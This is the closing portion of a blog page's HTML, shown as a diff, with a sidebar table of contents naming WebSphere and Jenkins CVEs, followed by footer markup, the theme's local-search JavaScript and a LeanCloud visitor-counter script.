class="nav-text">WebSphere</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2015-4852-1"><span class="nav-number">6.1.</span> <span class="nav-text">CVE-2015-4852</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jenkins"><span class="nav-number">7.</span> <span class="nav-text">Jenkins</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2015-8103"><span class="nav-number">7.1.</span> <span class="nav-text">CVE-2015-8103</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              
+
+            </div>
+          </section>
+        <!--/noindex-->
+        
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Orleven</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="http://www.orleven.com">orleven</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+  <div class="theme-info">  <a class="theme-link" target="_blank" href="https://blog.orleven.com">My blog</a> version 1.2 </div>
+
+
+
+  
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EdyobKaxPz3ofLTPlxfLIN1V-gzGzoHsz", "3hpzfKGL11zsIHV0ONyWgUgW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
